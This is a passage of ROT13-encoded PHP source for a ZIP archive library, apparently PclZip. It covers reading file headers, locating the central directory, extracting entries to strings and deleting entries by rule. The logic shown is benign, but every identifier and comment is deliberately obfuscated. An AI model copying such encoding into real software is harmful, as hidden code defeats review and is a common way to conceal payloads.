      $guvf->ceviPbairegUrnqre2SvyrVasb($c_ragel, $i_ybpny_urnqre);

      // ----- Pnyy gur pnyyonpx
      // Urer V qb abg hfr pnyy_hfre_shap() orpnhfr V arrq gb fraq n ersrerapr gb gur
      // urnqre.
      $i_erfhyg = $c_bcgvbaf[CPYMVC_PO_CBFG_RKGENPG](CPYMVC_PO_CBFG_RKGENPG, $i_ybpny_urnqre);

      // ----- Ybbx sbe nobeg erfhyg
      vs ($i_erfhyg == 2) {
      	$i_erfhyg = CPYMVC_REE_HFRE_NOBEGRQ;
      }
    }

    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviRkgenpgSvyrNfFgevat()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviRkgenpgSvyrNfFgevat(&$c_ragel, &$c_fgevat, &$c_bcgvbaf)
  {
    $i_erfhyg=1;

    // ----- Ernq gur svyr urnqre
    $i_urnqre = neenl();
    vs (($i_erfhyg = $guvf->ceviErnqSvyrUrnqre($i_urnqre)) != 1)
    {
      // ----- Erghea
      erghea $i_erfhyg;
    }


    // ----- Purpx gung gur svyr urnqre vf pburerag jvgu $c_ragel vasb
    vs ($guvf->ceviPurpxSvyrUrnqref($i_urnqre, $c_ragel) != 1) {
        // GOP
    }

    // ----- Ybbx sbe cer-rkgenpg pnyyonpx
    vs (vffrg($c_bcgvbaf[CPYMVC_PO_CER_RKGENPG])) {

      // ----- Trarengr n ybpny vasbezngvba
      $i_ybpny_urnqre = neenl();
      $guvf->ceviPbairegUrnqre2SvyrVasb($c_ragel, $i_ybpny_urnqre);

      // ----- Pnyy gur pnyyonpx
      // Urer V qb abg hfr pnyy_hfre_shap() orpnhfr V arrq gb fraq n ersrerapr gb gur
      // urnqre.
      $i_erfhyg = $c_bcgvbaf[CPYMVC_PO_CER_RKGENPG](CPYMVC_PO_CER_RKGENPG, $i_ybpny_urnqre);
      vs ($i_erfhyg == 0) {
        // ----- Punatr gur svyr fgnghf
        $c_ragel['fgnghf'] = \"fxvccrq\";
        $i_erfhyg = 1;
      }

      // ----- Ybbx sbe nobeg erfhyg
      vs ($i_erfhyg == 2) {
        // ----- Guvf fgnghf vf vagreany naq jvyy or punatrq va 'fxvccrq'
        $c_ragel['fgnghf'] = \"nobegrq\";
      	$i_erfhyg = CPYMVC_REE_HFRE_NOBEGRQ;
      }

      // ----- Hcqngr gur vasbezngvba
      // Bayl fbzr svryqf pna or zbqvsvrq
      $c_ragel['svyranzr'] = $i_ybpny_urnqre['svyranzr'];
    }


    // ----- Ybbx vs rkgenpgvba fubhyq or qbar
    vs ($c_ragel['fgnghf'] == 'bx') {

      // ----- Qb gur rkgenpgvba (vs abg n sbyqre)
      vs (!(($c_ragel['rkgreany']&0k00000010)==0k00000010)) {
        // ----- Ybbx sbe abg pbzcerffrq svyr
  //      vs ($c_ragel['pbzcerffrq_fvmr'] == $c_ragel['fvmr'])
        vs ($c_ragel['pbzcerffvba'] == 0) {

          // ----- Ernqvat gur svyr
          vs ($c_ragel['pbzcerffrq_fvmr'] > 0) {
            $c_fgevat = @sernq($guvf->mvc_sq, $c_ragel['pbzcerffrq_fvmr']);
          }
          ryfr {
            $c_fgevat = '';
          }
        }
        ryfr {

          // ----- Ernqvat gur svyr
          vs ($c_ragel['pbzcerffrq_fvmr'] > 0) {
            $i_qngn = @sernq($guvf->mvc_sq, $c_ragel['pbzcerffrq_fvmr']);
          }
          ryfr {
            $i_qngn = '';
          }

          // ----- Qrpbzcerff gur svyr
          vs (($c_fgevat = @tmvasyngr($i_qngn)) === SNYFR) {
              // GOP
          }
        }

        // ----- Genpr
      }
      ryfr {
          // GOP : reebe : pna abg rkgenpg n sbyqre va n fgevat
      }

    }

  	// ----- Punatr nobeg fgnghf
  	vs ($c_ragel['fgnghf'] == \"nobegrq\") {
        $c_ragel['fgnghf'] = \"fxvccrq\";
  	}

    // ----- Ybbx sbe cbfg-rkgenpg pnyyonpx
    ryfrvs (vffrg($c_bcgvbaf[CPYMVC_PO_CBFG_RKGENPG])) {

      // ----- Trarengr n ybpny vasbezngvba
      $i_ybpny_urnqre = neenl();
      $guvf->ceviPbairegUrnqre2SvyrVasb($c_ragel, $i_ybpny_urnqre);

      // ----- Fjnc gur pbagrag gb urnqre
      $i_ybpny_urnqre['pbagrag'] = $c_fgevat;
      $c_fgevat = '';

      // ----- Pnyy gur pnyyonpx
      // Urer V qb abg hfr pnyy_hfre_shap() orpnhfr V arrq gb fraq n ersrerapr gb gur
      // urnqre.
      $i_erfhyg = $c_bcgvbaf[CPYMVC_PO_CBFG_RKGENPG](CPYMVC_PO_CBFG_RKGENPG, $i_ybpny_urnqre);

      // ----- Fjnc onpx gur pbagrag gb urnqre
      $c_fgevat = $i_ybpny_urnqre['pbagrag'];
      hafrg($i_ybpny_urnqre['pbagrag']);

      // ----- Ybbx sbe nobeg erfhyg
      vs ($i_erfhyg == 2) {
      	$i_erfhyg = CPYMVC_REE_HFRE_NOBEGRQ;
      }
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviErnqSvyrUrnqre()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviErnqSvyrUrnqre(&$c_urnqre)
  {
    $i_erfhyg=1;

    // ----- Ernq gur 4 olgrf fvtangher
    $i_ovanel_qngn = @sernq($guvf->mvc_sq, 4);
    $i_qngn = hacnpx('Ivq', $i_ovanel_qngn);

    // ----- Purpx fvtangher
    vs ($i_qngn['vq'] != 0k04034o50)
    {

      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ONQ_SBEZNG, 'Vainyvq nepuvir fgehpgher');

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Ernq gur svefg 42 olgrf bs gur urnqre
    $i_ovanel_qngn = sernq($guvf->mvc_sq, 26);

    // ----- Ybbx sbe vainyvq oybpx fvmr
    vs (fgeyra($i_ovanel_qngn) != 26)
    {
      $c_urnqre['svyranzr'] = \"\";
      $c_urnqre['fgnghf'] = \"vainyvq_urnqre\";

      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ONQ_SBEZNG, \"Vainyvq oybpx fvmr : \".fgeyra($i_ovanel_qngn));

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Rkgenpg gur inyhrf
    $i_qngn = hacnpx('iirefvba/isynt/ipbzcerffvba/izgvzr/izqngr/Ipep/Ipbzcerffrq_fvmr/Ifvmr/isvyranzr_yra/irkgen_yra', $i_ovanel_qngn);

    // ----- Trg svyranzr
    $c_urnqre['svyranzr'] = sernq($guvf->mvc_sq, $i_qngn['svyranzr_yra']);

    // ----- Trg rkgen_svryqf
    vs ($i_qngn['rkgen_yra'] != 0) {
      $c_urnqre['rkgen'] = sernq($guvf->mvc_sq, $i_qngn['rkgen_yra']);
    }
    ryfr {
      $c_urnqre['rkgen'] = '';
    }

    // ----- Rkgenpg cebcregvrf
    $c_urnqre['irefvba_rkgenpgrq'] = $i_qngn['irefvba'];
    $c_urnqre['pbzcerffvba'] = $i_qngn['pbzcerffvba'];
    $c_urnqre['fvmr'] = $i_qngn['fvmr'];
    $c_urnqre['pbzcerffrq_fvmr'] = $i_qngn['pbzcerffrq_fvmr'];
    $c_urnqre['pep'] = $i_qngn['pep'];
    $c_urnqre['synt'] = $i_qngn['synt'];
    $c_urnqre['svyranzr_yra'] = $i_qngn['svyranzr_yra'];

    // ----- Erphcrengr qngr va HAVK sbezng
    $c_urnqre['zqngr'] = $i_qngn['zqngr'];
    $c_urnqre['zgvzr'] = $i_qngn['zgvzr'];
    vs ($c_urnqre['zqngr'] && $c_urnqre['zgvzr'])
    {
      // ----- Rkgenpg gvzr
      $i_ubhe = ($c_urnqre['zgvzr'] & 0kS800) >> 11;
      $i_zvahgr = ($c_urnqre['zgvzr'] & 0k07R0) >> 5;
      $i_frpbaqr = ($c_urnqre['zgvzr'] & 0k001S)*2;

      // ----- Rkgenpg qngr
      $i_lrne = (($c_urnqre['zqngr'] & 0kSR00) >> 9) + 1980;
      $i_zbagu = ($c_urnqre['zqngr'] & 0k01R0) >> 5;
      $i_qnl = $c_urnqre['zqngr'] & 0k001S;

      // ----- Trg HAVK qngr sbezng
      $c_urnqre['zgvzr'] = @zxgvzr($i_ubhe, $i_zvahgr, $i_frpbaqr, $i_zbagu, $i_qnl, $i_lrne);

    }
    ryfr
    {
      $c_urnqre['zgvzr'] = gvzr();
    }

    // GOP
    //sbe(erfrg($i_qngn); $xrl = xrl($i_qngn); arkg($i_qngn)) {
    //}

    // ----- Frg gur fgberq svyranzr
    $c_urnqre['fgberq_svyranzr'] = $c_urnqre['svyranzr'];

    // ----- Frg gur fgnghf svryq
    $c_urnqre['fgnghf'] = \"bx\";

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviErnqPragenySvyrUrnqre()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviErnqPragenySvyrUrnqre(&$c_urnqre)
  {
    $i_erfhyg=1;

    // ----- Ernq gur 4 olgrf fvtangher
    $i_ovanel_qngn = @sernq($guvf->mvc_sq, 4);
    $i_qngn = hacnpx('Ivq', $i_ovanel_qngn);

    // ----- Purpx fvtangher
    vs ($i_qngn['vq'] != 0k02014o50)
    {

      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ONQ_SBEZNG, 'Vainyvq nepuvir fgehpgher');

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Ernq gur svefg 42 olgrf bs gur urnqre
    $i_ovanel_qngn = sernq($guvf->mvc_sq, 42);

    // ----- Ybbx sbe vainyvq oybpx fvmr
    vs (fgeyra($i_ovanel_qngn) != 42)
    {
      $c_urnqre['svyranzr'] = \"\";
      $c_urnqre['fgnghf'] = \"vainyvq_urnqre\";

      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ONQ_SBEZNG, \"Vainyvq oybpx fvmr : \".fgeyra($i_ovanel_qngn));

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Rkgenpg gur inyhrf
    $c_urnqre = hacnpx('iirefvba/iirefvba_rkgenpgrq/isynt/ipbzcerffvba/izgvzr/izqngr/Ipep/Ipbzcerffrq_fvmr/Ifvmr/isvyranzr_yra/irkgen_yra/ipbzzrag_yra/iqvfx/ivagreany/Irkgreany/Ibssfrg', $i_ovanel_qngn);

    // ----- Trg svyranzr
    vs ($c_urnqre['svyranzr_yra'] != 0)
      $c_urnqre['svyranzr'] = sernq($guvf->mvc_sq, $c_urnqre['svyranzr_yra']);
    ryfr
      $c_urnqre['svyranzr'] = '';

    // ----- Trg rkgen
    vs ($c_urnqre['rkgen_yra'] != 0)
      $c_urnqre['rkgen'] = sernq($guvf->mvc_sq, $c_urnqre['rkgen_yra']);
    ryfr
      $c_urnqre['rkgen'] = '';

    // ----- Trg pbzzrag
    vs ($c_urnqre['pbzzrag_yra'] != 0)
      $c_urnqre['pbzzrag'] = sernq($guvf->mvc_sq, $c_urnqre['pbzzrag_yra']);
    ryfr
      $c_urnqre['pbzzrag'] = '';

    // ----- Rkgenpg cebcregvrf

    // ----- Erphcrengr qngr va HAVK sbezng
    //vs ($c_urnqre['zqngr'] && $c_urnqre['zgvzr'])
    // GOP : oht : guvf jnf vtabevat gvzr jvgu 0/0/0
    vs (1)
    {
      // ----- Rkgenpg gvzr
      $i_ubhe = ($c_urnqre['zgvzr'] & 0kS800) >> 11;
      $i_zvahgr = ($c_urnqre['zgvzr'] & 0k07R0) >> 5;
      $i_frpbaqr = ($c_urnqre['zgvzr'] & 0k001S)*2;

      // ----- Rkgenpg qngr
      $i_lrne = (($c_urnqre['zqngr'] & 0kSR00) >> 9) + 1980;
      $i_zbagu = ($c_urnqre['zqngr'] & 0k01R0) >> 5;
      $i_qnl = $c_urnqre['zqngr'] & 0k001S;

      // ----- Trg HAVK qngr sbezng
      $c_urnqre['zgvzr'] = @zxgvzr($i_ubhe, $i_zvahgr, $i_frpbaqr, $i_zbagu, $i_qnl, $i_lrne);

    }
    ryfr
    {
      $c_urnqre['zgvzr'] = gvzr();
    }

    // ----- Frg gur fgberq svyranzr
    $c_urnqre['fgberq_svyranzr'] = $c_urnqre['svyranzr'];

    // ----- Frg qrsnhyg fgnghf gb bx
    $c_urnqre['fgnghf'] = 'bx';

    // ----- Ybbx vs vg vf n qverpgbel
    vs (fhofge($c_urnqre['svyranzr'], -1) == '/') {
      //$c_urnqre['rkgreany'] = 0k41SS0010;
      $c_urnqre['rkgreany'] = 0k00000010;
    }


    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviPurpxSvyrUrnqref()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  //   1 ba fhpprff,
  //   0 ba reebe;
  // --------------------------------------------------------------------------------
  shapgvba ceviPurpxSvyrUrnqref(&$c_ybpny_urnqre, &$c_prageny_urnqre)
  {
    $i_erfhyg=1;

  	// ----- Purpx gur fgngvp inyhrf
  	// GOP
  	vs ($c_ybpny_urnqre['svyranzr'] != $c_prageny_urnqre['svyranzr']) {
  	}
  	vs ($c_ybpny_urnqre['irefvba_rkgenpgrq'] != $c_prageny_urnqre['irefvba_rkgenpgrq']) {
  	}
  	vs ($c_ybpny_urnqre['synt'] != $c_prageny_urnqre['synt']) {
  	}
  	vs ($c_ybpny_urnqre['pbzcerffvba'] != $c_prageny_urnqre['pbzcerffvba']) {
  	}
  	vs ($c_ybpny_urnqre['zgvzr'] != $c_prageny_urnqre['zgvzr']) {
  	}
  	vs ($c_ybpny_urnqre['svyranzr_yra'] != $c_prageny_urnqre['svyranzr_yra']) {
  	}

  	// ----- Ybbx sbe synt ovg 3
  	vs (($c_ybpny_urnqre['synt'] & 8) == 8) {
          $c_ybpny_urnqre['fvmr'] = $c_prageny_urnqre['fvmr'];
          $c_ybpny_urnqre['pbzcerffrq_fvmr'] = $c_prageny_urnqre['pbzcerffrq_fvmr'];
          $c_ybpny_urnqre['pep'] = $c_prageny_urnqre['pep'];
  	}

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviErnqRaqPragenyQve()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviErnqRaqPragenyQve(&$c_prageny_qve)
  {
    $i_erfhyg=1;

    // ----- Tb gb gur raq bs gur mvc svyr
    $i_fvmr = svyrfvmr($guvf->mvcanzr);
    @sfrrx($guvf->mvc_sq, $i_fvmr);
    vs (@sgryy($guvf->mvc_sq) != $i_fvmr)
    {
      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ONQ_SBEZNG, 'Hanoyr gb tb gb gur raq bs gur nepuvir \''.$guvf->mvcanzr.'\'');

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Svefg gel : ybbx vs guvf vf na nepuvir jvgu ab pbzzragnevrf (zbfg bs gur gvzr)
    // va guvf pnfr gur raq bs prageny qve vf ng 22 olgrf bs gur svyr raq
    $i_sbhaq = 0;
    vs ($i_fvmr > 26) {
      @sfrrx($guvf->mvc_sq, $i_fvmr-22);
      vs (($i_cbf = @sgryy($guvf->mvc_sq)) != ($i_fvmr-22))
      {
        // ----- Reebe ybt
        CpyMvc::ceviReebeYbt(CPYMVC_REE_ONQ_SBEZNG, 'Hanoyr gb frrx onpx gb gur zvqqyr bs gur nepuvir \''.$guvf->mvcanzr.'\'');

        // ----- Erghea
        erghea CpyMvc::reebePbqr();
      }

      // ----- Ernq sbe olgrf
      $i_ovanel_qngn = @sernq($guvf->mvc_sq, 4);
      $i_qngn = @hacnpx('Ivq', $i_ovanel_qngn);

      // ----- Purpx fvtangher
      vs ($i_qngn['vq'] == 0k06054o50) {
        $i_sbhaq = 1;
      }

      $i_cbf = sgryy($guvf->mvc_sq);
    }

    // ----- Tb onpx gb gur znkvzhz cbffvoyr fvmr bs gur Prageny Qve Raq Erpbeq
    vs (!$i_sbhaq) {
      $i_znkvzhz_fvmr = 65557; // 0kSSSS + 22;
      vs ($i_znkvzhz_fvmr > $i_fvmr)
        $i_znkvzhz_fvmr = $i_fvmr;
      @sfrrx($guvf->mvc_sq, $i_fvmr-$i_znkvzhz_fvmr);
      vs (@sgryy($guvf->mvc_sq) != ($i_fvmr-$i_znkvzhz_fvmr))
      {
        // ----- Reebe ybt
        CpyMvc::ceviReebeYbt(CPYMVC_REE_ONQ_SBEZNG, 'Hanoyr gb frrx onpx gb gur zvqqyr bs gur nepuvir \''.$guvf->mvcanzr.'\'');

        // ----- Erghea
        erghea CpyMvc::reebePbqr();
      }

      // ----- Ernq olgr cre olgr va beqre gb svaq gur fvtangher
      $i_cbf = sgryy($guvf->mvc_sq);
      $i_olgrf = 0k00000000;
      juvyr ($i_cbf < $i_fvmr)
      {
        // ----- Ernq n olgr
        $i_olgr = @sernq($guvf->mvc_sq, 1);

        // -----  Nqq gur olgr
        //$i_olgrf = ($i_olgrf << 8) | Beq($i_olgr);
        // Abgr jr znfx gur byq inyhr qbja fhpu gung bapr fuvsgrq jr pna arire raq hc jvgu zber guna n 32ovg ahzore
        // Bgurejvfr ba flfgrzf jurer jr unir 64ovg vagrtref gur purpx orybj sbe gur zntvp ahzore jvyy snvy.
        $i_olgrf = ( ($i_olgrf & 0kSSSSSS) << 8) | Beq($i_olgr);

        // ----- Pbzcner gur olgrf
        vs ($i_olgrf == 0k504o0506)
        {
          $i_cbf++;
          oernx;
        }

        $i_cbf++;
      }

      // ----- Ybbx vs abg sbhaq raq bs prageny qve
      vs ($i_cbf == $i_fvmr)
      {

        // ----- Reebe ybt
        CpyMvc::ceviReebeYbt(CPYMVC_REE_ONQ_SBEZNG, \"Hanoyr gb svaq Raq bs Prageny Qve Erpbeq fvtangher\");

        // ----- Erghea
        erghea CpyMvc::reebePbqr();
      }
    }

    // ----- Ernq gur svefg 18 olgrf bs gur urnqre
    $i_ovanel_qngn = sernq($guvf->mvc_sq, 18);

    // ----- Ybbx sbe vainyvq oybpx fvmr
    vs (fgeyra($i_ovanel_qngn) != 18)
    {

      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ONQ_SBEZNG, \"Vainyvq Raq bs Prageny Qve Erpbeq fvmr : \".fgeyra($i_ovanel_qngn));

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Rkgenpg gur inyhrf
    $i_qngn = hacnpx('iqvfx/iqvfx_fgneg/iqvfx_ragevrf/iragevrf/Ifvmr/Ibssfrg/ipbzzrag_fvmr', $i_ovanel_qngn);

    // ----- Purpx gur tybony fvmr
    vs (($i_cbf + $i_qngn['pbzzrag_fvmr'] + 18) != $i_fvmr) {

	  // ----- Erzbirq va eryrnfr 2.2 frr ernqzr svyr
	  // Gur purpx bs gur svyr fvmr vf n yvggyr gbb fgevpg.
	  // Fbzr ohtf jurer sbhaq jura n mvc vf rapelcgrq/qrpelcgrq jvgu 'pelcg'.
	  // Juvyr qrpelcgrq, mvc unf genvavat 0 olgrf
	  vs (0) {
      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ONQ_SBEZNG,
	                       'Gur prageny qve vf abg ng gur raq bs gur nepuvir.'
						   .' Fbzr genvyvat olgrf rkvfgf nsgre gur nepuvir.');

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
	  }
    }

    // ----- Trg pbzzrag
    vs ($i_qngn['pbzzrag_fvmr'] != 0) {
      $c_prageny_qve['pbzzrag'] = sernq($guvf->mvc_sq, $i_qngn['pbzzrag_fvmr']);
    }
    ryfr
      $c_prageny_qve['pbzzrag'] = '';

    $c_prageny_qve['ragevrf'] = $i_qngn['ragevrf'];
    $c_prageny_qve['qvfx_ragevrf'] = $i_qngn['qvfx_ragevrf'];
    $c_prageny_qve['bssfrg'] = $i_qngn['bssfrg'];
    $c_prageny_qve['fvmr'] = $i_qngn['fvmr'];
    $c_prageny_qve['qvfx'] = $i_qngn['qvfx'];
    $c_prageny_qve['qvfx_fgneg'] = $i_qngn['qvfx_fgneg'];

    // GOP
    //sbe(erfrg($c_prageny_qve); $xrl = xrl($c_prageny_qve); arkg($c_prageny_qve)) {
    //}

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviQryrgrOlEhyr()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviQryrgrOlEhyr(&$c_erfhyg_yvfg, &$c_bcgvbaf)
  {
    $i_erfhyg=1;
    $i_yvfg_qrgnvy = neenl();

    // ----- Bcra gur mvc svyr
    vs (($i_erfhyg=$guvf->ceviBcraSq('eo')) != 1)
    {
      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Ernq gur prageny qverpgbel vasbezngvba
    $i_prageny_qve = neenl();
    vs (($i_erfhyg = $guvf->ceviErnqRaqPragenyQve($i_prageny_qve)) != 1)
    {
      $guvf->ceviPybfrSq();
      erghea $i_erfhyg;
    }

    // ----- Tb gb ortvaavat bs Svyr
    @erjvaq($guvf->mvc_sq);

    // ----- Fpna nyy gur svyrf
    // ----- Fgneg ng ortvaavat bs Prageny Qve
    $i_cbf_ragel = $i_prageny_qve['bssfrg'];
    @erjvaq($guvf->mvc_sq);
    vs (@sfrrx($guvf->mvc_sq, $i_cbf_ragel))
    {
      // ----- Pybfr gur mvc svyr
      $guvf->ceviPybfrSq();

      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_NEPUVIR_MVC, 'Vainyvq nepuvir fvmr');

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Ernq rnpu ragel
    $i_urnqre_yvfg = neenl();
    $w_fgneg = 0;
    sbe ($v=0, $i_ao_rkgenpgrq=0; $v<$i_prageny_qve['ragevrf']; $v++)
    {

      // ----- Ernq gur svyr urnqre
      $i_urnqre_yvfg[$i_ao_rkgenpgrq] = neenl();
      vs (($i_erfhyg = $guvf->ceviErnqPragenySvyrUrnqre($i_urnqre_yvfg[$i_ao_rkgenpgrq])) != 1)
      {
        // ----- Pybfr gur mvc svyr
        $guvf->ceviPybfrSq();

        erghea $i_erfhyg;
      }


      // ----- Fgber gur vaqrk
      $i_urnqre_yvfg[$i_ao_rkgenpgrq]['vaqrk'] = $v;

      // ----- Ybbx sbe gur fcrpvsvp rkgenpg ehyrf
      $i_sbhaq = snyfr;

      // ----- Ybbx sbe rkgenpg ol anzr ehyr
      vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_OL_ANZR]))
          && ($c_bcgvbaf[CPYMVC_BCG_OL_ANZR] != 0)) {

          // ----- Ybbx vs gur svyranzr vf va gur yvfg
          sbe ($w=0; ($w<fvmrbs($c_bcgvbaf[CPYMVC_BCG_OL_ANZR])) && (!$i_sbhaq); $w++) {

              // ----- Ybbx sbe n qverpgbel
              vs (fhofge($c_bcgvbaf[CPYMVC_BCG_OL_ANZR][$w], -1) == \"/\") {

                  // ----- Ybbx vs gur qverpgbel vf va gur svyranzr cngu
                  vs (   (fgeyra($i_urnqre_yvfg[$i_ao_rkgenpgrq]['fgberq_svyranzr']) > fgeyra($c_bcgvbaf[CPYMVC_BCG_OL_ANZR][$w]))
                      && (fhofge($i_urnqre_yvfg[$i_ao_rkgenpgrq]['fgberq_svyranzr'], 0, fgeyra($c_bcgvbaf[CPYMVC_BCG_OL_ANZR][$w])) == $c_bcgvbaf[CPYMVC_BCG_OL_ANZR][$w])) {
                      $i_sbhaq = gehr;
                  }
                  ryfrvs (   (($i_urnqre_yvfg[$i_ao_rkgenpgrq]['rkgreany']&0k00000010)==0k00000010) /* Vaqvpngrf n sbyqre */
                          && ($i_urnqre_yvfg[$i_ao_rkgenpgrq]['fgberq_svyranzr'].'/' == $c_bcgvbaf[CPYMVC_BCG_OL_ANZR][$w])) {
                      $i_sbhaq = gehr;
                  }
              }
              // ----- Ybbx sbe n svyranzr
              ryfrvs ($i_urnqre_yvfg[$i_ao_rkgenpgrq]['fgberq_svyranzr'] == $c_bcgvbaf[CPYMVC_BCG_OL_ANZR][$w]) {
                  $i_sbhaq = gehr;
              }
          }
      }

      // ----- Ybbx sbe rkgenpg ol rert ehyr
      // rert() vf qrcerpngrq jvgu CUC 5.3
      /*
      ryfr vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_OL_RERT]))
               && ($c_bcgvbaf[CPYMVC_BCG_OL_RERT] != \"\")) {

          vs (rert($c_bcgvbaf[CPYMVC_BCG_OL_RERT], $i_urnqre_yvfg[$i_ao_rkgenpgrq]['fgberq_svyranzr'])) {
              $i_sbhaq = gehr;
          }
      }
      */

      // ----- Ybbx sbe rkgenpg ol cert ehyr
      ryfr vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_OL_CERT]))
               && ($c_bcgvbaf[CPYMVC_BCG_OL_CERT] != \"\")) {

          vs (cert_zngpu($c_bcgvbaf[CPYMVC_BCG_OL_CERT], $i_urnqre_yvfg[$i_ao_rkgenpgrq]['fgberq_svyranzr'])) {
              $i_sbhaq = gehr;
          }
      }

      // ----- Ybbx sbe rkgenpg ol vaqrk ehyr
      ryfr vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_OL_VAQRK]))
               && ($c_bcgvbaf[CPYMVC_BCG_OL_VAQRK] != 0)) {

          // ----- Ybbx vs gur vaqrk vf va gur yvfg
          sbe ($w=$w_fgneg; ($w<fvmrbs($c_bcgvbaf[CPYMVC_BCG_OL_VAQRK])) && (!$i_sbhaq); $w++) {

              vs (($v>=$c_bcgvbaf[CPYMVC_BCG_OL_VAQRK][$w]['fgneg']) && ($v<=$c_bcgvbaf[CPYMVC_BCG_OL_VAQRK][$w]['raq'])) {
                  $i_sbhaq = gehr;
              }
              vs ($v>=$c_bcgvbaf[CPYMVC_BCG_OL_VAQRK][$w]['raq']) {
                  $w_fgneg = $w+1;
              }

              vs ($c_bcgvbaf[CPYMVC_BCG_OL_VAQRK][$w]['fgneg']>$v) {
                  oernx;
              }
          }
      }
      ryfr {
      	$i_sbhaq = gehr;
      }

      // ----- Ybbx sbe qryrgvba
      vs ($i_sbhaq)
      {
        hafrg($i_urnqre_yvfg[$i_ao_rkgenpgrq]);
      }
      ryfr
      {
        $i_ao_rkgenpgrq++;
      }
    }

    // ----- Ybbx vs fbzrguvat arrq gb or qryrgrq
    vs ($i_ao_rkgenpgrq > 0) {

        // ----- Perngrf n grzcbenel svyr
        $i_mvc_grzc_anzr = CPYMVC_GRZCBENEL_QVE.havdvq('cpymvc-').'.gzc';

        // ----- Perngrf n grzcbenel mvc nepuvir
        $i_grzc_mvc = arj CpyMvc($i_mvc_grzc_anzr);

        // ----- Bcra gur grzcbenel mvc svyr va jevgr zbqr
        vs (($i_erfhyg = $i_grzc_mvc->ceviBcraSq('jo')) != 1) {
            $guvf->ceviPybfrSq();

            // ----- Erghea
            erghea $i_erfhyg;
        }

        // ----- Ybbx juvpu svyr arrq gb or xrcg
        sbe ($v=0; $v<fvmrbs($i_urnqre_yvfg); $v++) {

            // ----- Pnyphyngr gur cbfvgvba bs gur urnqre
            @erjvaq($guvf->mvc_sq);
            vs (@sfrrx($guvf->mvc_sq,  $i_urnqre_yvfg[$v]['bssfrg'])) {
                // ----- Pybfr gur mvc svyr
                $guvf->ceviPybfrSq();
                $i_grzc_mvc->ceviPybfrSq();
                @hayvax($i_mvc_grzc_anzr);

                // ----- Reebe ybt
                CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_NEPUVIR_MVC, 'Vainyvq nepuvir fvmr');

                // ----- Erghea
                erghea CpyMvc::reebePbqr();
            }

            // ----- Ernq gur svyr urnqre
            $i_ybpny_urnqre = neenl();
            vs (($i_erfhyg = $guvf->ceviErnqSvyrUrnqre($i_ybpny_urnqre)) != 1) {
                // ----- Pybfr gur mvc svyr
                $guvf->ceviPybfrSq();
                $i_grzc_mvc->ceviPybfrSq();
                @hayvax($i_mvc_grzc_anzr);

                // ----- Erghea
                erghea $i_erfhyg;
            }

            // ----- Purpx gung ybpny svyr urnqre vf fnzr nf prageny svyr urnqre
            vs ($guvf->ceviPurpxSvyrUrnqref($i_ybpny_urnqre,
			                                $i_urnqre_yvfg[$v]) != 1) {
                // GOP
            }
            hafrg($i_ybpny_urnqre);

            // ----- Jevgr gur svyr urnqre
            vs (($i_erfhyg = $i_grzc_mvc->ceviJevgrSvyrUrnqre($i_urnqre_yvfg[$v])) != 1) {
                // ----- Pybfr gur mvc svyr
                $guvf->ceviPybfrSq();
                $i_grzc_mvc->ceviPybfrSq();
                @hayvax($i_mvc_grzc_anzr);

                // ----- Erghea
                erghea $i_erfhyg;
            }

            // ----- Ernq/jevgr gur qngn oybpx
            vs (($i_erfhyg = CpyMvcHgvyPbclOybpx($guvf->mvc_sq, $i_grzc_mvc->mvc_sq, $i_urnqre_yvfg[$v]['pbzcerffrq_fvmr'])) != 1) {
                // ----- Pybfr gur mvc svyr
                $guvf->ceviPybfrSq();
                $i_grzc_mvc->ceviPybfrSq();
                @hayvax($i_mvc_grzc_anzr);
